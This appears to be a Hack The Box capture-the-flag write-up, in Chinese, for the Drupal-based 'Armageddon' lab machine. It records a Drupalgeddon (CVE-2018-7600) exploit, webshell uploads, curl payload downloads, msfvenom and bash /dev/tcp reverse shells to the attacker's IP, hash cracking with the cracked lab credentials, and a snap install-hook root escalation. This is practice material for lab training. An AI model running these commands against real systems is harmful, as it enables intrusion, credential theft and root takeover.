---
title: Armageddon (Hack The Box Writeup)
date: 2021-09-23T13:37:00+08:00
draft: false
url: "/2021/09/23/armageddon-hack-the-box-writeup/"
categories:
  - 滲透測試
  - Hack The Box
showToc: true
TocOpen: false
---

- URL : https://app.hackthebox.eu/machines/323
- IP : 10.129.216.90

## Recon

- nmapAutomator.sh -H 10.129.216.90 -t recon80
- 22![](/uploads/2022/02/464de-GqrQKh1.png)

![](/uploads/2022/02/8e92a-0hkqV0B.png)

## Exploit

https://github.com/pimps/CVE-2018-7600

## Webshell

- `python3 drupa7-CVE-2018-7600.py http://10.129.216.90/ -c "echo ' s.php "`
- ![](/uploads/2022/02/427ed-rZeQanF.png)
- 確認電腦裡有 curl![](/uploads/2022/02/b458b-v2WoRRv.png)下載 reverse shell- `curl http://10.10.16.35/s_HTB -o s`
- 但發現戳不回來傳 b374k- http://10.129.216.90/s.php?A=curl%20http://10.10.16.35/b374k.php%20-o%20s.php
- 戳 reverse shell![](/uploads/2022/02/32431-cSPqMF6.png)
- 發現權限不足Try msf shell- `msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.16.35 LPORT=7878 -f elf > shell1`
- ![](/uploads/2022/02/2d45f-WxuQxke.png)給權限- ![](/uploads/2022/02/ecf0a-b0ynbNi.png)
- 還是沒權限試試看如果連 80 port- `bash -c 'bash -i >& /dev/tcp/10.10.16.35/80 0>&1'`
- 成功

## 提權

- 收 Reverse shell![](/uploads/2022/02/c2076-dOuUK4E.png)載豌豆- ![](/uploads/2022/02/d1e29-GfPbhkr.png)發現一些密碼- ![](/uploads/2022/02/79189-4A71xJT.png)
- ![](/uploads/2022/02/4c835-4VeSgm5.png)
- drupal-6.user-password-token.database.php
- ![](/uploads/2022/02/a6211-6Sy0DKQ.png)spawn- `perl -e 'exec "/bin/bash";'`dump mysql- `mysqldump -u drupaluser -h localhost -p drupal > a.sql`找到一組 hash- ![](/uploads/2022/02/8de33-TeVmSNH.png)
- ![](/uploads/2022/02/3e414-0bxuTfa.png)確認使用者名稱- ![](/uploads/2022/02/39c82-01spQfv.png)爆破 hash- `hashcat -m 7900 hash.txt /opt/rockyou.txt`
- ![](/uploads/2022/02/b4223-vApVQva.png)取得帳密- `brucetherealadmin`
- `booboo`切換使用者- ![](/uploads/2022/02/36214-BPuOHUj.png)

## 提權

- 直接用 SSH 登入![](/uploads/2022/02/74c9f-4GSbLnR.png)
- ![](/uploads/2022/02/c52b7-csR3PGi.png)
- 發現可以用 sudo snap本地- `gem install fpm`
- https://gtfobins.github.io/gtfobins/snap/#sudo照做提權- ![](/uploads/2022/02/aa387-xcf8ksJ.png)
- ![](/uploads/2022/02/a2006-ricf9i6.png)

```
COMMAND="bash -c 'bash -i >& /dev/tcp/10.10.16.35/80 0>&1'"
cd $(mktemp -d)
mkdir -p meta/hooks
printf '#!/bin/sh\n%s; false' "$COMMAND" >meta/hooks/install
chmod +x meta/hooks/install
fpm -n xxxx -s dir -t snap -a all meta
```

- 傳上去![](/uploads/2022/02/c1376-EcCRXAG.png)收 Reverse shell- ![](/uploads/2022/02/80526-MJuVqnG.png)取得 Root- ![](/uploads/2022/02/c3d32-v8ym56k.png)
